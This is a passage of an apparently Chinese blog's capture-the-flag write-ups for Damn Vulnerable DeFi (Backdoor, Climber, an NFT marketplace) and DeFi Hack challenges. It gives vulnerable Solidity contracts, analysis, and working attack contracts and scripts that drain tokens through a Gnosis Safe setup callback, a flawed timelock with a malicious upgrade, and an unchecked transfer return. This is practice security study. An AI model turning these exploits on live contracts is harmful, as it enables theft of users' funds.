&#123;&#125;\n&#125;\n\nanalyze在buyone()函数欻存在漏洞。\n我们要先审计token中的erc721合约，该合约下有一个safeTransferFrom方法，进行审计。\n function safeTransferFrom(\n        address from,\n        address to,\n        uint256 tokenId\n    ) public virtual override &#123;\n        safeTransferFrom(from, to, tokenId, \"\");\n    &#125;\n\n    /**\n     * @dev See &#123;IERC721-safeTransferFrom&#125;.\n     */\n    function safeTransferFrom(\n        address from,\n        address to,\n        uint256 tokenId,\n        bytes memory _data\n    ) public virtual override &#123;\n        require(_isApprovedOrOwner(_msgSender(), tokenId), \"ERC721: transfer caller is not owner nor approved\");\n        _safeTransfer(from, to, tokenId, _data);\n    &#125;\n    \n    //调用了_safeTransfer()函数\n      function _safeTransfer(\n        address from,\n        address to,\n        uint256 tokenId,\n        bytes memory _data\n    ) internal virtual &#123;\n        _transfer(from, to, tokenId);\n        require(_checkOnERC721Received(from, to, tokenId, _data), \"ERC721: transfer to non ERC721Receiver implementer\");\n    &#125;\n    \n    //调用了_transfer()函数\n    function _transfer(\n        address from,\n        address to,\n        uint256 tokenId\n    ) internal virtual &#123;\n        require(ERC721.ownerOf(tokenId) == from, \"ERC721: transfer from incorrect owner\");\n        require(to != address(0), \"ERC721: transfer to the zero address\");\n\n        _beforeTokenTransfer(from, to, tokenId);\n\n        // Clear approvals from the previous owner\n        _approve(address(0), tokenId);\n\n        _balances[from] -= 1;\n        _balances[to] += 1;\n        _owners[tokenId] = to;\n\n        emit Transfer(from, to, tokenId);\n\n        _afterTokenTransfer(from, to, tokenId);\n    &#125;\n\n//在此处可以发现 _owners[tokenId] = to这句代码，转账之后，token的拥有者发生改变\n//发现漏洞，返回初始合约\n\n由于在进行了buyone()下的safeTransferFrom之后，token.ownerOf(tokenId)已经变成购买者，所以下一句payable(token.ownerOf(tokenId)).sendValue(priceToPay)相当于将刚刚用来购买nft的eth归还给了购买者。\n再buyone()函数下还存在另一个漏洞，因为再buymany()处事循环调用buyone()函数，然而buyone()函数中使用的 require(msg.value &gt;&#x3D; priceToPay)所以可以在一次循环中用一份的价格购买多个nft。\n所以，借15个eth，开买！\nattack11.Backdoor\n\n\n\n\n\n\n\n\n题目要求：\nTo incentivize the creation of more secure wallets in their team, someone has deployed a registry of Gnosis Safe wallets. When someone in the team deploys and registers a wallet, they will earn 10 DVT tokens.\nTo make sure everything is safe and sound, the registry tightly integrates with the legitimate Gnosis Safe Proxy Factory, and has some additional safety checks.\nCurrently there are four people registered as beneficiaries: Alice, Bob, Charlie and David. The registry has 40 DVT tokens in balance to be distributed among them.\nYour goal is to take all funds from the registry. In a single transaction.\ncode// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol\";\nimport \"@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol\";\n\n/**\n * @title WalletRegistry\n * @notice A registry for Gnosis Safe wallets.\n           When known beneficiaries deploy and register their wallets, the registry sends some Damn Valuable Tokens to the wallet.\n * @dev The registry has embedded verifications to ensure only legitimate Gnosis Safe wallets are stored.\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */\ncontract WalletRegistry is IProxyCreationCallback, Ownable &#123;\n    \n    uint256 private constant MAX_OWNERS = 1;\n    uint256 private constant MAX_THRESHOLD = 1;\n    uint256 private constant TOKEN_PAYMENT = 10 ether; // 10 * 10 ** 18\n    \n    address public immutable masterCopy;\n    address public immutable walletFactory;\n    IERC20 public immutable token;\n\n    mapping (address => bool) public beneficiaries;\n\n    // owner => wallet\n    mapping (address => address) public wallets;\n\n    constructor(\n        address masterCopyAddress,\n        address walletFactoryAddress, \n        address tokenAddress,\n        address[] memory initialBeneficiaries\n    ) &#123;\n        require(masterCopyAddress != address(0));\n        require(walletFactoryAddress != address(0));\n\n        masterCopy = masterCopyAddress;\n        walletFactory = walletFactoryAddress;\n        token = IERC20(tokenAddress);\n\n        for (uint256 i = 0; i &lt; initialBeneficiaries.length; i++) &#123;\n            addBeneficiary(initialBeneficiaries[i]);\n        &#125;\n    &#125;\n\n    function addBeneficiary(address beneficiary) public onlyOwner &#123;\n        beneficiaries[beneficiary] = true;\n    &#125;\n\n    function _removeBeneficiary(address beneficiary) private &#123;\n        beneficiaries[beneficiary] = false;\n    &#125;\n\n    /**\n     @notice Function executed when user creates a Gnosis Safe wallet via GnosisSafeProxyFactory::createProxyWithCallback\n             setting the registry's address as the callback.\n     */\n    function proxyCreated(\n        GnosisSafeProxy proxy,\n        address singleton,\n        bytes calldata initializer,\n        uint256\n    ) external override &#123;\n        // Make sure we have enough DVT to pay\n        require(token.balanceOf(address(this)) >= TOKEN_PAYMENT, \"Not enough funds to pay\");\n\n        address payable walletAddress = payable(proxy);\n\n        // Ensure correct factory and master copy\n        require(msg.sender == walletFactory, \"Caller must be factory\");\n        require(singleton == masterCopy, \"Fake mastercopy used\");\n        \n        // Ensure initial calldata was a call to `GnosisSafe::setup`\n        require(bytes4(initializer[:4]) == GnosisSafe.setup.selector, \"Wrong initialization\");\n\n        // Ensure wallet initialization is the expected\n        require(GnosisSafe(walletAddress).getThreshold() == MAX_THRESHOLD, \"Invalid threshold\");\n        require(GnosisSafe(walletAddress).getOwners().length == MAX_OWNERS, \"Invalid number of owners\");       \n\n        // Ensure the owner is a registered beneficiary\n        address walletOwner = GnosisSafe(walletAddress).getOwners()[0];\n\n        require(beneficiaries[walletOwner], \"Owner is not registered as beneficiary\");\n\n        // Remove owner as beneficiary\n        _removeBeneficiary(walletOwner);\n\n        // Register the wallet under the owner's address\n        wallets[walletOwner] = walletAddress;\n\n        // Pay tokens to the newly created wallet\n        token.transfer(walletAddress, TOKEN_PAYMENT);        \n    &#125;\n&#125;\n\nanalyzeGnosisSafeProxyFactory合约通过deployProxyWithNonce创建GnosisSafeProxy，createProxyWithCallback函数会调用createProxyWithNonce函数，而且只要提供了有效的initalizer就会直接进行call调用。\n所以：\n创建带有approve功能的攻击合约，abi编码approve函数作为setup函数的data，abi编码setup函数作为createProxyWithCallback下的initializer。\n这样就做到了创建合约时进行了setup函数调用，同时回调了wallet合约下的proxyCreated函数，完成这些时，token已经被转到了proxy合约下，此时因为initializer的原因又调用了approve函数，进行了将proxy合约的token授权给攻击合约的操作，再transferfrom即可通关\nattackattackcontract\n\n\ninterface ProxyFactory &#123;\n    function createProxyWithCallback(\n        address _singleton,\n        bytes memory initializer,\n        uint256 saltNonce,\n        IProxyCreationCallback callback\n    ) external returns (GnosisSafeProxy proxy);\n&#125;\ninterface IProxyCreationCallback&#123;&#125;\ninterface GnosisSafeProxy&#123;&#125;\ninterface IERC20&#123;\n    function transferFrom(address,address,uint)external;\n     function approve(address spender, uint token) external;\n&#125;\ncontract attackcontract&#123;\n    address public masterCopyAddress;\n    address public walletRegistryAddress;\n    ProxyFactory proxyFactory;\n    constructor (address _proxyFactoryAddress, address _walletRegistryAddress, address _masterCopyAddress, address _token) &#123;\n        proxyFactory = ProxyFactory(_proxyFactoryAddress);\n        walletRegistryAddress = _walletRegistryAddress;\n        masterCopyAddress = _masterCopyAddress;\n    &#125;\n     function approve(address spender, address token) external &#123;\n        IERC20(token).approve(spender, type(uint256).max);\n    &#125;\n     function attack(address tokenAddress, address hacker, address[] memory victims) public &#123;\n        for (uint256 i = 0; i &lt; victims.length; i++) &#123;\n            address victim = victims[i];\n            address[] memory owners = new address[](1);\n            owners[0] = victim;\n            bytes memory encodedApprove = abi.encodeWithSignature(\"approve(address,address)\", address(this), tokenAddress);\n            bytes memory initializer = abi.encodeWithSignature(\"setup(address[],uint256,address,bytes,address,address,uint256,address)\",\n                owners, 1, address(this), encodedApprove, address(0), 0, 0, 0);\n            GnosisSafeProxy proxy =\n            proxyFactory.createProxyWithCallback(masterCopyAddress, initializer, 0, IProxyCreationCallback(walletRegistryAddress));\n            IERC20(tokenAddress).transferFrom(address(proxy), hacker, 10 ether);\n        &#125;\n    &#125;\n&#125;\n\n\n\n\nthis.attackerContract  = await (await ethers.getContractFactory('attackcontract', attacker)).deploy(\n            this.walletFactory.address,\n            this.walletRegistry.address,\n            this.masterCopy.address,\n            this.token.address\n        );\n\n        await this.attackerContract.connect(attacker).attack(this.token.address, attacker.address, users);\n\n12.Climber\n\n\n\n\n\n\n\n\n题目要求：\nThere’s a secure vault contract guarding 10 million DVT tokens. The vault is upgradeable, following the UUPS pattern.\nThe owner of the vault, currently a timelock contract, can withdraw a very limited amount of tokens every 15 days.\nOn the vault there’s an additional role with powers to sweep all tokens in case of an emergency.\nOn the timelock, only an account with a “Proposer” role can schedule actions that can be executed 1 hour later.\nYour goal is to empty the vault.\nClimberVault code// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\nimport \"./ClimberTimelock.sol\";\n\n/**\n * @title ClimberVault\n * @dev To be deployed behind a proxy following the UUPS pattern. Upgrades are to be triggered by the owner.\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */\ncontract ClimberVault is Initializable, OwnableUpgradeable, UUPSUpgradeable &#123;\n\n    uint256 public constant WITHDRAWAL_LIMIT = 1 ether;\n    uint256 public constant WAITING_PERIOD = 15 days;\n\n    uint256 private _lastWithdrawalTimestamp;\n    address private _sweeper;\n\n    modifier onlySweeper() &#123;\n        require(msg.sender == _sweeper, \"Caller must be sweeper\");\n        _;\n    &#125;\n\n    /// @custom:oz-upgrades-unsafe-allow constructor\n    constructor() initializer &#123;&#125;\n\n    function initialize(address admin, address proposer, address sweeper) initializer external &#123;\n        // Initialize inheritance chain\n        __Ownable_init();\n        __UUPSUpgradeable_init();\n\n        // Deploy timelock and transfer ownership to it\n        transferOwnership(address(new ClimberTimelock(admin, proposer)));\n\n        _setSweeper(sweeper);\n        _setLastWithdrawal(block.timestamp);\n        _lastWithdrawalTimestamp = block.timestamp;\n    &#125;\n\n    // Allows the owner to send a limited amount of tokens to a recipient every now and then\n    function withdraw(address tokenAddress, address recipient, uint256 amount) external onlyOwner &#123;\n        require(amount &lt;= WITHDRAWAL_LIMIT, \"Withdrawing too much\");\n        require(block.timestamp > _lastWithdrawalTimestamp + WAITING_PERIOD, \"Try later\");\n        \n        _setLastWithdrawal(block.timestamp);\n\n        IERC20 token = IERC20(tokenAddress);\n        require(token.transfer(recipient, amount), \"Transfer failed\");\n    &#125;\n\n    // Allows trusted sweeper account to retrieve any tokens\n    function sweepFunds(address tokenAddress) external onlySweeper &#123;\n        IERC20 token = IERC20(tokenAddress);\n        require(token.transfer(_sweeper, token.balanceOf(address(this))), \"Transfer failed\");\n    &#125;\n\n    function getSweeper() external view returns (address) &#123;\n        return _sweeper;\n    &#125;\n\n    function _setSweeper(address newSweeper) internal &#123;\n        _sweeper = newSweeper;\n    &#125;\n\n    function getLastWithdrawalTimestamp() external view returns (uint256) &#123;\n        return _lastWithdrawalTimestamp;\n    &#125;\n\n    function _setLastWithdrawal(uint256 timestamp) internal &#123;\n        _lastWithdrawalTimestamp = timestamp;\n    &#125;\n\n    // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade\n    function _authorizeUpgrade(address newImplementation) internal onlyOwner override &#123;&#125;\n&#125;\n\nClimberTimelock code// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/access/AccessControl.sol\";\nimport \"@openzeppelin/contracts/utils/Address.sol\";\n\n/**\n * @title ClimberTimelock\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */\ncontract ClimberTimelock is AccessControl &#123;\n    using Address for address;\n\n    bytes32 public constant ADMIN_ROLE = keccak256(\"ADMIN_ROLE\");\n    bytes32 public constant PROPOSER_ROLE = keccak256(\"PROPOSER_ROLE\");\n\n    // Possible states for an operation in this timelock contract\n    enum OperationState &#123;\n        Unknown,\n        Scheduled,\n        ReadyForExecution,\n        Executed\n    &#125;\n\n    // Operation data tracked in this contract\n    struct Operation &#123;\n        uint64 readyAtTimestamp;   // timestamp at which the operation will be ready for execution\n        bool known;         // whether the operation is registered in the timelock\n        bool executed;      // whether the operation has been executed\n    &#125;\n\n    // Operations are tracked by their bytes32 identifier\n    mapping(bytes32 => Operation) public operations;\n\n    uint64 public delay = 1 hours;\n\n    constructor(\n        address admin,\n        address proposer\n    ) &#123;\n        _setRoleAdmin(ADMIN_ROLE, ADMIN_ROLE);\n        _setRoleAdmin(PROPOSER_ROLE, ADMIN_ROLE);\n\n        // deployer + self administration\n        _setupRole(ADMIN_ROLE, admin);\n        _setupRole(ADMIN_ROLE, address(this));\n\n        _setupRole(PROPOSER_ROLE, proposer);\n    &#125;\n\n    function getOperationState(bytes32 id) public view returns (OperationState) &#123;\n        Operation memory op = operations[id];\n        \n        if(op.executed) &#123;\n            return OperationState.Executed;\n        &#125; else if(op.readyAtTimestamp >= block.timestamp) &#123;\n            return OperationState.ReadyForExecution;\n        &#125; else if(op.readyAtTimestamp > 0) &#123;\n            return OperationState.Scheduled;\n        &#125; else &#123;\n            return OperationState.Unknown;\n        &#125;\n    &#125;\n\n    function getOperationId(\n        address[] calldata targets,\n        uint256[] calldata values,\n        bytes[] calldata dataElements,\n        bytes32 salt\n    ) public pure returns (bytes32) &#123;\n        return keccak256(abi.encode(targets, values, dataElements, salt));\n    &#125;\n\n    function schedule(\n        address[] calldata targets,\n        uint256[] calldata values,\n        bytes[] calldata dataElements,\n        bytes32 salt\n    ) external onlyRole(PROPOSER_ROLE) &#123;\n        require(targets.length > 0 &amp;&amp; targets.length &lt; 256);\n        require(targets.length == values.length);\n        require(targets.length == dataElements.length);\n\n        bytes32 id = getOperationId(targets, values, dataElements, salt);\n        require(getOperationState(id) == OperationState.Unknown, \"Operation already known\");\n        \n        operations[id].readyAtTimestamp = uint64(block.timestamp) + delay;\n        operations[id].known = true;\n    &#125;\n\n    /** Anyone can execute what has been scheduled via `schedule` */\n    function execute(\n        address[] calldata targets,\n        uint256[] calldata values,\n        bytes[] calldata dataElements,\n        bytes32 salt\n    ) external payable &#123;\n        require(targets.length > 0, \"Must provide at least one target\");\n        require(targets.length == values.length);\n        require(targets.length == dataElements.length);\n\n        bytes32 id = getOperationId(targets, values, dataElements, salt);\n\n        for (uint8 i = 0; i &lt; targets.length; i++) &#123;\n            targets[i].functionCallWithValue(dataElements[i], values[i]);\n        &#125;\n        \n        require(getOperationState(id) == OperationState.ReadyForExecution);\n        operations[id].executed = true;\n    &#125;\n\n    function updateDelay(uint64 newDelay) external &#123;\n        require(msg.sender == address(this), \"Caller must be timelock itself\");\n        require(newDelay &lt;= 14 days, \"Delay must be 14 days or less\");\n        delay = newDelay;\n    &#125;\n\n    receive() external payable &#123;&#125;\n&#125;\n\nanalyze问题1：只有sweepFunds(0函数可以一次性取走全部的token，但是该函数被限制为onlySweeper，显然这里不可行，但是合约可以升级，我们可以升级合约去除onlySweeper限制\n问题2：分析ClimberTimelock合约下的execute()函数，发现函数的执行逻辑存在问题，先执行再判断限制条件，所以会产生漏洞，可以在execute()函数下的call处调用schedule()函数使得execute()函数的最后一条require条件满足，但是发现这行不通，因为调用函数时进行了role检测，显然我们没有role，但是我们可以grantRole进行set，为攻击合约setrole，然后在攻击合约下调用schedule()函数。\n分析到这里这道题基本就已经解决了，剩下就是编写攻击合约以及编写更新合约的问题了\nattackattackcontract\n\ninterface ClimberVault1&#123;&#125;\ninterface ClimberTimelock1&#123;\n    function execute(address[] calldata targets,uint256[] calldata values,bytes[] calldata dataElements,bytes32 salt) external payable;\n    function schedule(address[] calldata targets,uint256[] calldata values,bytes[] calldata dataElements,bytes32 salt) external;\n&#125;\ncontract attackclimber &#123;\n    ClimberVault1 public vault;\n    address payable timelock;\n\n    address[] public targets;\n    uint256[] public values;\n    bytes[] public dataElements;\n    bytes32 salt;\n\n    constructor(address _vault, address payable _timelock) &#123;\n        vault = ClimberVault1(_vault);\n        timelock = _timelock;\n    &#125;\n\n    function attack(address attacker) external &#123;\n        targets.push(timelock);\n        targets.push(timelock);\n        targets.push(address(vault));\n        targets.push(address(this));\n        values.push(0);\n        values.push(0);\n        values.push(0);\n        values.push(0);\n\n        bytes memory data = abi.encodeWithSignature(\"updateDelay(uint64)\", uint64(0));\n\n        bytes memory data0 = abi.encodeWithSignature(\n            \"grantRole(bytes32,address)\",\n            keccak256(\"PROPOSER_ROLE\"),\n            address(this)\n        );\n\n        bytes memory data1 = abi.encodeWithSignature(\n            \"transferOwnership(address)\",\n            attacker\n        );\n\n        bytes memory data2 = abi.encodeWithSignature(\"schedule()\");\n\n        dataElements.push(data);\n        dataElements.push(data0);\n        dataElements.push(data1);\n        dataElements.push(data2);\n\n        salt=keccak256(\"66\");\n\n        ClimberTimelock1(timelock).execute(targets, values, dataElements, salt);\n    &#125;\n\n    function schedule() external &#123;\n        ClimberTimelock1(timelock).schedule(targets, values, dataElements, salt);\n    &#125;\n&#125;\n\nupgradecontract\n\n\ninterface Initializable&#123;\n&#125;\ninterface OwnableUpgradeable&#123;\n   \n    \n&#125;\ninterface UUPSUpgradeable&#123;\n    \n    &#125;\ninterface IERC20&#123;\n     function transfer(address to, uint256 amount) external returns (bool);\n     function balanceOf(address account) external view returns (uint256);\n&#125;\ncontract UpgradedAttacker is Initializable, OwnableUpgradeable, UUPSUpgradeable &#123;\n\n    uint256 public constant WITHDRAWAL_LIMIT = 1 ether;\n    uint256 public constant WAITING_PERIOD = 15 days;\n\n    uint256 private _lastWithdrawalTimestamp;\n    address private _sweeper;\n    modifier initializer()&#123;_;&#125;\n\n    /// @custom:oz-upgrades-unsafe-allow constructor\n    constructor() initializer &#123;&#125;\n\n    function initialize() initializer external &#123;\n        __Ownable_init();\n        __UUPSUpgradeable_init();\n    &#125;\n\n    function sweepFunds(address tokenAddress) external  &#123;\n        IERC20 token = IERC20(tokenAddress);\n        require(token.transfer(msg.sender, token.balanceOf(address(this))), \"Transfer failed\");\n    &#125;\n\n    function _authorizeUpgrade(address newImplementation) internal  &#123;\n    &#125;\n     function __Ownable_init() internal&#123;&#125;\n     function __UUPSUpgradeable_init() internal&#123;&#125;\n&#125;\n\nconst attackclimber = await ethers.getContractFactory('attackclimber', attacker);\n        this.attackc = await attackclimber.deploy(this.vault.address, this.timelock.address);\n        await this.attackc.connect(attacker).attack(attacker.address);\n\n        const VaultV2 = await ethers.getContractFactory('UpgradedAttacker', attacker);\n        this.vaultV2 = await VaultV2.deploy();\n        const vaultV2Interface = VaultV2.interface;\n        const data = vaultV2Interface.encodeFunctionData('sweepFunds', [this.token.address]);\n        await this.vault.connect(attacker).upgradeToAndCall(this.vaultV2.address, data);\n\n总结这个题库做到这里就已经结束了，相比之前做过的其他的题库，这个系列难度要更高一些，代码审计量也相对提升。做起来还是有些困难，但是还是学到了许多新的东西。\n","slug":"Damn Vulnerable DeFi","date":"2022-08-02T02:49:20.316Z","categories_index":"","tags_index":"区块链","author_index":"bcYng"},{"id":"68b9de7ae4d5b3763a05a9fb9f649b30","title":"Defi Hack","content":"题库地址：https://www.defihack.xyz/\nDefi Hack1.May The Force Be With You\n\n\n\n\n\n\n\n\nRequestA long time ago in a galaxy far, far away… a new DAO was created. Can you steal all the YODA tokens belonging to MayTheForceBeWithYou contract?\nCodepragma solidity ^0.6.0;\n\nimport \"@openzeppelin/contracts/math/SafeMath.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/SafeERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/utils/ReentrancyGuard.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\ncontract MayTheForceBeWithYou is ERC20, ReentrancyGuard &#123;\n    using SafeMath for uint256;\n    MiniMeToken public yoda;\n\n    event Withdraw(address indexed beneficiary, uint256 amount);\n    event Deposit(address indexed beneficiary, uint256 amount);\n\n    // Define the Yoda token contract\n    constructor(address _underlying) ERC20(\"xYODA\", \"xYODA\") public &#123;\n        yoda = MiniMeToken(_underlying);\n    &#125;\n\n    function deposit(uint256 amount) external nonReentrant &#123;\n        // Gets the amount of YODA locked in the contract\n        uint256 totalYoda = yoda.balanceOf(address(this));\n        // Gets the amount of xYODA in existence\n        uint256 totalShares = totalSupply();\n        // If no xYODA exists, mint it 1:1 to the amount put in\n        if (totalShares == 0 || totalYoda == 0) &#123;\n            _mint(msg.sender, amount);\n        &#125;\n        // Calculate and mint the amount of xYODA the YODA is worth. The ratio will change overtime, as xYODA is burned/minted and YODA deposited + gained from fees / withdrawn.\n        else &#123;\n            uint256 what = amount.mul(totalShares).div(totalYoda);\n            _mint(msg.sender, what);\n        &#125;\n        // Lock the YODA in the contract\n        yoda.transferFrom(msg.sender, address(this), amount);\n\n        emit Deposit(msg.sender, amount);\n    &#125;\n\n    function withdraw(uint256 numberOfShares) external nonReentrant &#123;\n        // Gets the amount of xYODA in existence\n        uint256 totalShares = totalSupply();\n        // Calculates the amount of YODA the xYODA is worth\n        uint256 what =\n            numberOfShares.mul(yoda.balanceOf(address(this))).div(totalShares);\n        _burn(msg.sender, numberOfShares);\n        yoda.transfer(msg.sender, what);\n\n        emit Withdraw(msg.sender, what);\n    &#125;\n&#125;\n\ncontract MiniMeToken is Ownable &#123;\n    using SafeMath for uint256;\n\n    string public name;\n    uint8 public decimals;\n    string public symbol;\n\n    mapping (address => uint256) balances;\n    mapping (address => mapping (address => uint256)) allowed;\n    uint256 totalSupply;\n\n    constructor(\n        string memory _tokenName,\n        uint8 _decimalUnits,\n        string memory _tokenSymbol\n    )  public\n    &#123;\n        name = _tokenName;                                 // Set the name\n        decimals = _decimalUnits;                          // Set the decimals\n        symbol = _tokenSymbol;                             // Set the symbol\n    &#125;\n\n\n    function transfer(address _to, uint256 _amount) public returns (bool success) &#123;\n        return doTransfer(msg.sender, _to, _amount);\n    &#125;\n\n\n    function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success) &#123;\n        if (allowed[_from][msg.sender] &lt; _amount)\n            return false;\n        allowed[_from][msg.sender] -= _amount;\n        return doTransfer(_from, _to, _amount);\n    &#125;\n\n\n    function doTransfer(address _from, address _to, uint _amount) internal returns(bool) &#123;\n        if (_amount == 0) &#123;\n            return true;\n        &#125;\n        // Do not allow transfer to 0x0 or the token contract itself\n        require((_to != address(0)) &amp;&amp; (_to != address(this)));\n        // If the amount being transfered is more than the balance of the\n        //  account the transfer returns false\n        if (balances[_from] &lt; _amount) &#123;\n            return false;\n        &#125;\n\n        // First update the balance array with the new value for the address\n        //  sending the tokens\n        balances[_from] = balances[_from] - _amount;\n        // Then update the balance array with the new value for the address\n        //  receiving the tokens\n\n        require(balances[_to] + _amount >= balances[_to]); // Check for overflow\n        balances[_to] = balances[_to] + _amount;\n        // An event to make the transfer easy to find on the blockchain\n        Transfer(_from, _to, _amount);\n        return true;\n    &#125;\n\n\n    function approve(address _spender, uint256 _amount) public returns (bool success) &#123;\n        require((_amount == 0) || (allowed[msg.sender][_spender] == 0));\n\n        allowed[msg.sender][_spender] = _amount;\n        Approval(msg.sender, _spender, _amount);\n        return true;\n    &#125;\n\n    function allowance(address _owner, address _spender) public view returns (uint256 remaining) &#123;\n        return allowed[_owner][_spender];\n    &#125;\n\n    function balanceOf(address _owner) public view returns (uint256 balance) &#123;\n      return balances[_owner];\n    &#125;\n\n    function mint(address _owner, uint256 _amount) public onlyOwner &#123;\n      balances[_owner] = _amount;\n      totalSupply += _amount;\n    &#125;\n\n    event Transfer(address indexed _from, address indexed _to, uint256 _amount);\n    event Approval(\n        address indexed _owner,\n        address indexed _spender,\n        uint256 _amount\n      );\n&#125;\n\n\nAnalyze分析deposit函数，初始状态下totalsupply为0，所以存在一个任意铸币漏洞，我们可以额任意进行铸币，使得totalsupply不为0，即可进行withdraw函数，再分析withdraw函数时发现，对于输入的numberOfShares并没有限制，并且what的值是由合约的余额计算的，输入的数值若是和totalsupply相等即可相互抵消，但是问题来了，我们并没有足够的余额，转账不会报错吗？往下继续分析，调用了yoda合约的transfer函数，transfer函数又调用了doTransfer函数，在此处进行了余额判断，但是问题也发生在此，仅仅是return一个false，而没有进行require，所以交易不会回滚，即没有余额也可以直接转账。所以思路出来了，先deposit，再以相同的参数调用withdraw函数集合通关\nAttackawait contract.deposit(100)\nawait contract.withdraw('100')\n\n\n2.DiscoLPRequest\n\n\n\n\n\n\n\n\nDiscoLP is a brand new liquidity mining protocol! You can participate by depositing some JIMBO or JAMBO tokens. All liquidity will be supplied to JIMBO-JAMBO Uniswap pair. By providing liquidity with us you will get DISCO tokens in return!\nYou have 1 JIMBO and 1 JAMBO, can you get at least 100 DISCO tokens?\nCodepragma solidity >=0.6.5;\n\nimport \"@openzeppelin/contracts/math/SafeMath.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/SafeERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/utils/ReentrancyGuard.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"./Babylonian.sol\";\n\ncontract DiscoLP is ERC20, Ownable, ReentrancyGuard\n&#123;\n  using SafeERC20 for IERC20;\n\n  address public immutable reserveToken;\n\n  constructor (string memory _name, string memory _symbol, uint8 _decimals, address _reserveToken)\n    ERC20(_name, _symbol) public\n  &#123;\n    _setupDecimals(_decimals);\n    assert(_reserveToken != address(0));\n    reserveToken = _reserveToken;\n    _mint(address(this), 100000 * 10 ** 18); // some inital supply\n  &#125;\n\n  function calcCostFromShares(uint256 _shares) public view returns (uint256 _cost)\n  &#123;\n    return _shares.mul(totalReserve()).div(totalSupply());\n  &#125;\n\n  function totalReserve() public view returns (uint256 _totalReserve)\n  &#123;\n    return IERC20(reserveToken).balanceOf(address(this));\n  &#125;\n\n  // accepts only JIMBO or JAMBO tokens\n  function depositToken(address _token, uint256 _amount, uint256 _minShares) external nonReentrant\n  &#123;\n    address _from = msg.sender;\n    uint256 _minCost = calcCostFromShares(_minShares);\n    if (_amount != 0) &#123;\n      IERC20(_token).safeTransferFrom(_from, address(this), _amount);\n    &#125;\n    uint256 _cost = UniswapV2LiquidityPoolAbstraction._joinPool(reserveToken, _token, _amount, _minCost);\n    uint256 _shares = _cost.mul(totalSupply()).div(totalReserve().sub(_cost));\n    _mint(_from, _shares);\n  &#125;\n&#125;\n\nlibrary UniswapV2LiquidityPoolAbstraction\n&#123;\n  using SafeMath for uint256;\n  using SafeERC20 for IERC20;\n\n  function _joinPool(address _pair, address _token, uint256 _amount, uint256 _minShares) internal returns (uint256 _shares)\n  &#123;\n    if (_amount == 0) return 0;\n    address _router = $.UniswapV2_ROUTER02;\n    address _token0 = Pair(_pair).token0();\n    address _token1 = Pair(_pair).token1();\n    address _otherToken = _token == _token0 ? _token1 : _token0;\n    (uint256 _reserve0, uint256 _reserve1,) = Pair(_pair).getReserves();\n    uint256 _swapAmount = _calcSwapOutputFromInput(_token == _token0 ? _reserve0 : _reserve1, _amount);\n    if (_swapAmount == 0) _swapAmount = _amount / 2;\n    uint256 _leftAmount = _amount.sub(_swapAmount);\n    _approveFunds(_token, _router, _amount);\n    address[] memory _path = new address[](2);\n    _path[0] = _token;\n    _path[1] = _otherToken;\n    uint256 _otherAmount = Router02(_router).swapExactTokensForTokens(_swapAmount, 1, _path, address(this), uint256(-1))[1];\n    _approveFunds(_otherToken, _router, _otherAmount);\n    (,,_shares) = Router02(_router).addLiquidity(_token, _otherToken, _leftAmount, _otherAmount, 1, 1, address(this), uint256(-1));\n    require(_shares >= _minShares, \"high slippage\");\n    return _shares;\n  &#125;\n\n  function _calcSwapOutputFromInput(uint256 _reserveAmount, uint256 _inputAmount) private pure returns (uint256)\n  &#123;\n    return Babylonian.sqrt(_reserveAmount.mul(_inputAmount.mul(3988000).add(_reserveAmount.mul(3988009)))).sub(_reserveAmount.mul(1997)) / 1994;\n  &#125;\n\n  function _approveFunds(address _token, address _to, uint256 _amount) internal\n  &#123;\n    uint256 _allowance = IERC20(_token).allowance(address(this), _to);\n    if (_allowance > _amount) &#123;\n      IERC20(_token).safeDecreaseAllowance(_to, _allowance - _amount);\n    &#125;\n    else\n    if (_allowance &lt; _amount) &#123;\n      IERC20(_token).safeIncreaseAllowance(_to, _amount - _allowance);\n    &#125;\n  &#125;\n&#125;\n\nlibrary $\n&#123;\n  address constant UniswapV2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f; // ropsten\n  address constant UniswapV2_ROUTER02 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // ropsten\n&#125;\n\ninterface Router01\n&#123;\n  function WETH() external pure returns (address _token);\n  function addLiquidity(address _tokenA, address _tokenB, uint256 _amountADesired, uint256 _amountBDesired, uint256 _amountAMin, uint256 _amountBMin, address _to, uint256 _deadline) external returns (uint256 _amountA, uint256 _amountB, uint256 _liquidity);\n  function removeLiquidity(address _tokenA, address _tokenB, uint256 _liquidity, uint256 _amountAMin, uint256 _amountBMin, address _to, uint256 _deadline) external returns (uint256 _amountA, uint256 _amountB);\n  function swapExactTokensForTokens(uint256 _amountIn, uint256 _amountOutMin, address[] calldata _path, address _to, uint256 _deadline) external returns (uint256[] memory _amounts);\n  function swapETHForExactTokens(uint256 _amountOut, address[] calldata _path, address _to, 